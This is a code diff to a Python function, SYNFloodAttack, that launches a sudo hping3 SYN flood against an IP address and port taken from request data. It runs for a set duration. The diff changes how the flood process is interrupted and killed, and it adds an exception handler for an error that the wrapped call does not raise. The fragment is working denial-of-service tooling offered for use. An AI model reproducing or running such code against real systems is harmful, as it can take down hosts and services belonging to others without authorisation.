@@ -19,9 +19,16 @@ def SYNFloodAttack():
     duration = int(data["duration"])
 
     dosCommand = subprocess.Popen(['sudo', 'hping3', '-S', '--flood', '-p', portNumber, ipAddress])
-
     time.sleep(duration) # carry out attack for specified duration
-    dosCommand.send_signal(signal.SIGINT) # interrupt the attack to stop it
+
+    try:
+        # Send CTRL+c to kill the child process from su -
+        dosCommand.send_signal(signal.SIGINT)
+        print("CTRL+c killed the process")
+    except subprocess.TimeoutExpired:
+        print('Timeout occured')
+    
+    dosCommand.kill()
 
     return "DoS Complete"
 
